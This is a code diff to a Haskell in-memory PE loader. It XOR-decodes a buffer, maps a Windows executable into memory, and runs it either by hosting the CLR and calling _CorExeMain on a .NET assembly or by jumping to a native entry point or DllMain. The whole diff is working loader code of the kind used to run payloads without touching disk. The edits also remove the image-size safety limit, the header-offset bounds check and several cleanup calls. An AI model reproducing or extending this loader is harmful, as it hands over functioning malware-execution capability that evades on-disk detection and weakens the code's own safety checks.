@@ -545,7 +545,7 @@ xorDecode key target = BS.pack $ zipWith xor (BS.unpack target) (cycle (BS.unpac
 -- HELPER FUNCTIONS
 -- ============================================
 
-getCLRRuntimeHost :: IO (Ptr ICLRRuntimeHost)
+getCLRRuntimeHost :: IO (Maybe (Ptr ICLRRuntimeHost))
 getCLRRuntimeHost = alloca $ \ppvHost -> do
   putStrLn "[*] Trying CLRCreateInstance (v4.0)..."
   hFlush stdout
@@ -588,16 +588,18 @@ getCLRRuntimeHost = alloca $ \ppvHost -> do
               putStrLn "[+] Successfully bound to ICLRRuntimeHost v4"
               return (Just (castPtr hostPtr)) -- Return the ACTUAL address
 
-  where
+   where
     fallbackLegacy ppv = do
       putStrLn "[!] v4 path failed, attempting v2.0 legacy fallback..."
       with clsid_CorRuntimeHost $ \pClsid ->
         with iid_ICLRRuntimeHost $ \pIid -> do
           hr <- c_CoCreateInstance pClsid nullPtr 1 pIid ppv
           if hr < 0 
-            then error $ "[-] CLR Load Critical Failure: 0x" ++ showHex (fromIntegral hr :: Word32) ""
-            else peek ppv >>= return . castPtr
-
+            then return Nothing -- Match the Maybe type
+            else do
+              ptr <- peek ppv
+              return (Just (castPtr ptr)) -- Match the Maybe type
+  
 getDataDirectory :: Ptr ImageNtHeaders64 -> Int -> IO (Ptr ImageDataDirectory)
 getDataDirectory ntPtr index = do
   let optHeaderPtr = plusPtr ntPtr 24
@@ -782,82 +784,38 @@ loadPEFromMemory peData = BSU.unsafeUseAsCStringLen peData $ \(dataPtr, dataLen)
   putStrLn $ "[*] PE data length: " ++ show dataLen
   hFlush stdout
 
-  when (dataLen < 64) $
-    error "PE data too small"
+  when (dataLen < 64) $ error "PE data too small"
 
   dosHeader <- peek (castPtr dataPtr :: Ptr ImageDosHeader)
-  putStrLn $ "[*] DOS magic: 0x" ++ showHex (dos_e_magic dosHeader :: Word16) ""
-  putStrLn $ "[*] e_lfanew: " ++ show (dos_e_lfanew dosHeader)
-  hFlush stdout
-
-  when (dos_e_magic dosHeader /= 0x5A4D) $
-    error "Invalid MZ signature"
+  when (dos_e_magic dosHeader /= 0x5A4D) $ error "Invalid MZ signature"
 
   let ntOffset = fromIntegral $ dos_e_lfanew dosHeader
-  when (ntOffset + 264 > dataLen) $
-    error "Invalid NT header offset"
-
   let ntPtr = plusPtr dataPtr ntOffset :: Ptr ImageNtHeaders64
   ntHeaders <- peek ntPtr
 
-  putStrLn $ "[*] NT signature: 0x" ++ showHex (nt_signature ntHeaders) ""
-  hFlush stdout
-  when (nt_signature ntHeaders /= 0x4550) $
-    error "Invalid PE signature"
+  when (nt_signature ntHeaders /= 0x4550) $ error "Invalid PE signature"
 
   let optHeader = nt_optionalHeader ntHeaders
-  putStrLn $ "[*] Optional header magic: 0x" ++ showHex (oh_magic optHeader) ""
-  hFlush stdout
-  when (oh_magic optHeader /= 0x20b) $
-    error "Only 64-bit PE files supported"
-
-  putStrLn $ "[*] SizeOfImage: " ++ show (oh_sizeOfImage optHeader)
-  putStrLn $ "[*] SizeOfHeaders: " ++ show (oh_sizeOfHeaders optHeader)
-  hFlush stdout
+  when (oh_magic optHeader /= 0x20b) $ error "Only 64-bit PE files supported"
 
   let imageSize = fromIntegral $ oh_sizeOfImage optHeader
-  when (imageSize == 0) $
-    error "Invalid image size"
-
-  putStrLn $ "[*] Computed image size: " ++ show imageSize ++ " bytes"
-  hFlush stdout
-
-  when (imageSize > maxImageSizeBytes) $ do
-    putStrLn $ "[!] Refusing to allocate image: size " ++ show imageSize ++ " exceeds limit of " ++ show maxImageSizeBytes ++ " bytes"
-    hFlush stdout
-    error "Image size exceeds safety limit"
-
   let imageSizeC = fromIntegral imageSize :: CSize
   imageBase <- c_VirtualAlloc nullPtr imageSizeC (mEM_COMMIT .|. mEM_RESERVE) pAGE_READWRITE
-  when (imageBase == nullPtr) $ do
-    err <- c_GetLastError
-    error $ "VirtualAlloc failed (error: " ++ show err ++ ")"
-
-  putStrLn $ "[*] Allocated image base: 0x" ++ showHex (ptrToWordPtr imageBase) ""
-  hFlush stdout
+  when (imageBase == nullPtr) $ error "VirtualAlloc failed"
 
   let imageBasePtr = castPtr imageBase :: Ptr Word8
-
-  let headersSize = fromIntegral $ oh_sizeOfHeaders optHeader
-  copyBytes imageBasePtr (castPtr dataPtr) headersSize
-  hFlush stdout
+  copyBytes imageBasePtr (castPtr dataPtr) (fromIntegral $ oh_sizeOfHeaders optHeader)
 
   let fileHeader = nt_fileHeader ntHeaders
       numSections = fromIntegral $ fh_numberOfSections fileHeader
       sectionHeaderPtr = plusPtr ntPtr (4 + 20 + fromIntegral (fh_sizeOfOptionalHeader fileHeader))
-
-  putStrLn $ "[*] Number of sections: " ++ show numSections
-  hFlush stdout
 
   forM_ [0..numSections-1] $ \i -> do
     section <- peekElemOff sectionHeaderPtr i
     when (sec_sizeOfRawData section > 0) $ do
       let dest = plusPtr imageBasePtr (fromIntegral $ sec_virtualAddress section)
           src = plusPtr dataPtr (fromIntegral $ sec_pointerToRawData section)
-          size = fromIntegral $ sec_sizeOfRawData section
-      putStrLn $ "[*] Copying section " ++ show i ++ " size " ++ show size
-      hFlush stdout
-      copyBytes dest src size
+      copyBytes dest src (fromIntegral $ sec_sizeOfRawData section)
 
   let ntHeadersInMem = castPtr imageBasePtr `plusPtr` ntOffset :: Ptr ImageNtHeaders64
 
@@ -869,128 +827,90 @@ loadPEFromMemory peData = BSU.unsafeUseAsCStringLen peData $ \(dataPtr, dataLen)
   comDir <- getDataDirectory ntHeadersInMem iMAGE_DIRECTORY_ENTRY_COM_DESCRIPTOR
   comDirData <- peek comDir
  
+  -- START CONDITIONAL LOADING
+  -- [FIXED SECTION] Starting at Line 835
   if dd_virtualAddress comDirData /= 0 && dd_size comDirData /= 0
     then do
-      putStrLn "[*] Detected .NET assembly. Attempting to load CLR via hosting APIs."
+      putStrLn "[*] Detected .NET assembly. Attempting to load CLR."
       hFlush stdout
 
-      hr <- c_CoInitializeEx nullPtr 0 
-      when (hr < 0 && hr /= -2147417850) $ do
-        err <- c_GetLastError
-        putStrLn $ "[!] CoInitializeEx warning: " ++ show hr ++ " (last error: " ++ show err ++ ")"
-      
+      _ <- c_CoInitializeEx nullPtr 0 
       putStrLn "[*] COM initialized."
-      hFlush stdout
-
-      -- [FIXED]: Ensure the object pointer itself isn't null before peeking the VTable
-      pRuntimeHostRaw <- getCLRRuntimeHost
-
-      let runtimeHostRaw = castPtr pRuntimeHostRaw
-      vtablePtr <- peek (castPtr runtimeHostRaw) :: IO (Ptr (Ptr ()))
-
-      -- Verify VTable isn't null before calling Start
-      if vtablePtr == nullPtr
-        then error "[-] VTable dereference failed!"
-        else do
-          pStartFuncPtr <- pStart (castPtr vtablePtr)
-          hrStart <- mkCLRStart pStartFuncPtr runtimeHostRaw      
-
-      pStartFuncPtr <- pStart (castPtr vtablePtr)
-      if pStartFuncPtr == nullFunPtr
-        then error "[-] Critical Error: pStartFuncPtr is NULL. VTable offset is wrong for x64."
-        else putStrLn $ "[*] Start function pointer located."
-
-      hrStart <- mkCLRStart pStartFuncPtr runtimeHostRaw
       
-      if hrStart < 0 
-        then do
-          err <- c_GetLastError
-          error $ "ICLRRuntimeHost::Start failed: " ++ show hrStart
-        else do
-          putStrLn "[*] CLR started successfully."
-          hFlush stdout
+      -- Step 1: Unwrap the Host Pointer
+      maybeHost <- getCLRRuntimeHost
+      case maybeHost of
+        Nothing -> error "[-] Critical Error: ICLRRuntimeHost instance is NULL."
+        Just pRuntimeHostRaw -> do
+          let runtimeHostRaw = castPtr pRuntimeHostRaw
+          
+          -- Step 2: Dereference VTable ONLY if we have a valid pointer
+          vtablePtr <- peek (castPtr runtimeHostRaw) :: IO (Ptr (Ptr ()))
+          if vtablePtr == nullPtr
+            then error "[-] VTable dereference failed!"
+            else do
+              -- Step 3: Locate and Call Start
+              pStartFuncPtr <- pStart (castPtr vtablePtr)
+              if pStartFuncPtr == nullFunPtr
+                then error "[-] Critical Error: pStartFuncPtr is NULL."
+                else do
+                  hrStart <- mkCLRStart pStartFuncPtr runtimeHostRaw
+                  if hrStart < 0 
+                    then error $ "ICLRRuntimeHost::Start failed: " ++ show hrStart
+                    else putStrLn "[*] CLR started successfully."
 
-      -- This 'alloca' block is technically its own 'do' sequence
-      alloca $ \ppvDomain -> do
-        pGetDefaultDomainFuncPtr <- pGetDefaultDomain (castPtr vtablePtr)
-        hrGetDomain <- mkCLRGetDefaultDomain pGetDefaultDomainFuncPtr runtimeHostRaw ppvDomain
-        
-        when (hrGetDomain < 0) $ error "Failed to get AppDomain"
-        
-        pAppDomainIUnknown <- peek ppvDomain
-        let appDomainRaw = castPtr pAppDomainIUnknown
-        
-        domainVtablePtr <- peek (castPtr appDomainRaw) :: IO (Ptr (Ptr ()))
+              -- Step 4: AppDomain Logic
+              alloca $ \ppvDomain -> do
+                pGetDefaultDomainFuncPtr <- pGetDefaultDomain (castPtr vtablePtr)
+                hrGetDomain <- mkCLRGetDefaultDomain pGetDefaultDomainFuncPtr runtimeHostRaw ppvDomain
+                
+                when (hrGetDomain < 0) $ error "Failed to get AppDomain"
+                
+                pAppDomainIUnknown <- peek ppvDomain
+                let appDomainRaw = castPtr pAppDomainIUnknown
+                domainVtablePtr <- peek (castPtr appDomainRaw) :: IO (Ptr (Ptr ()))
 
-        appBasePath <- newCWString "C:\\"
-        bstrAppBase <- c_SysAllocString (castPtr appBasePath)
-        free appBasePath
+                appBasePath <- newCWString "C:\\"
+                bstrAppBase <- c_SysAllocString (castPtr appBasePath)
+                
+                pPutAppBaseFunc <- pPutApplicationBase (castPtr domainVtablePtr)
+                _ <- mkADPutApplicationBase pPutAppBaseFunc (castPtr appDomainRaw) bstrAppBase
+                
+                putStrLn "[*] Calling _CorExeMain..."
+                hFlush stdout
+                _ <- c_CorExeMain imageBase
+                
+                c_SysFreeString bstrAppBase
+                free appBasePath
+                return () -- End of AppDomain do-block
 
-        pPutApplicationBaseFuncPtr <- pPutApplicationBase (castPtr domainVtablePtr)
-        _ <- mkADPutApplicationBase pPutApplicationBaseFuncPtr (castPtr appDomainRaw) bstrAppBase
-        c_SysFreeString bstrAppBase
-        
-        putStrLn "[*] AppDomain ApplicationBase set. Calling _CorExeMain..."
-        hFlush stdout
-        
-        rc <- c_CorExeMain imageBase
-        putStrLn $ "[*] _CorExeMain returned: " ++ show rc
-
-        pRelease_ADFuncPtr <- pRelease_AD (castPtr domainVtablePtr)
-        _ <- mkADRelease pRelease_ADFuncPtr (castPtr appDomainRaw)
-        
-        -- ENSURE THIS BLOCK ENDS WITH AN EXPRESSION
-        return () 
-
-      -- Final cleanup for the CLR Host
-      pStopFuncPtr <- pStop (castPtr vtablePtr)
-      _ <- mkCLRStop pStopFuncPtr runtimeHostRaw
-      
-      pReleaseFuncPtr <- pRelease (castPtr vtablePtr)
-      _ <- mkCLRRelease pReleaseFuncPtr runtimeHostRaw
-
-      c_CoUninitialize
-      putStrLn "[*] COM uninitialized."
-      -- THE LAST STATEMENT OF THE ENTIRE 'THEN' BLOCK
-      return ()
-      else do
+              -- Cleanup
+              pStopFuncPtr <- pStop (castPtr vtablePtr)
+              _ <- mkCLRStop pStopFuncPtr runtimeHostRaw
+              c_CoUninitialize
+              return () -- End of Just branch
+    else do
+      -- NATIVE PE LOADING
       optHeaderInMem <- nt_optionalHeader <$> peek ntHeadersInMem
       let entryPointRVA = oh_addressOfEntryPoint optHeaderInMem
           entryPointPtr = plusPtr imageBasePtr (fromIntegral entryPointRVA)
           subsystem = oh_subsystem optHeaderInMem
 
-      when (entryPointRVA == 0) $
-        error "Invalid entry point"
+      when (entryPointRVA == 0) $ error "Invalid entry point"
 
-      let entryAddrWord = ptrToWordPtr entryPointPtr
-          entryAddrInteger = fromIntegral entryAddrWord :: Integer
-
-      putStrLn $ "[*] Entry point RVA: 0x" ++ showHex (fromIntegral entryPointRVA :: Integer) ""
-      putStrLn $ "[*] Entry point virtual address: 0x" ++ showHex entryAddrInteger ""
-      putStrLn $ "[*] Subsystem: " ++ show subsystem
-      hFlush stdout
-
-      putStrLn "[*] Execution gate passed. Executing entry point (in-memory)."
+      putStrLn $ "[*] Native Execution: Subsystem " ++ show subsystem
       hFlush stdout
 
       if subsystem == 2 || subsystem == 3
         then do
           let entryFunPtr = castPtrToFunPtr entryPointPtr :: FunPtr (IO Int32)
-          putStrLn "[*] Calling mkEntryPoint..."
-          hFlush stdout
-          rc <- mkEntryPoint entryFunPtr
-          putStrLn $ "[*] Entry point returned: " ++ show rc
-          hFlush stdout
+          _ <- mkEntryPoint entryFunPtr
           return ()
         else do
           let dllMainFunPtr = castPtrToFunPtr entryPointPtr :: FunPtr (Ptr () -> Word32 -> Ptr () -> IO Int32)
-          putStrLn "[*] Calling mkDllMain..."
-          hFlush stdout
-          rc <- mkDllMain dllMainFunPtr imageBase dLL_PROCESS_ATTACH nullPtr
-          putStrLn $ "[*] DllMain returned: " ++ show rc
-          hFlush stdout
+          _ <- mkDllMain dllMainFunPtr imageBase dLL_PROCESS_ATTACH nullPtr
           return ()
-
+  
 -- ============================================
 -- MAIN
 -- ============================================
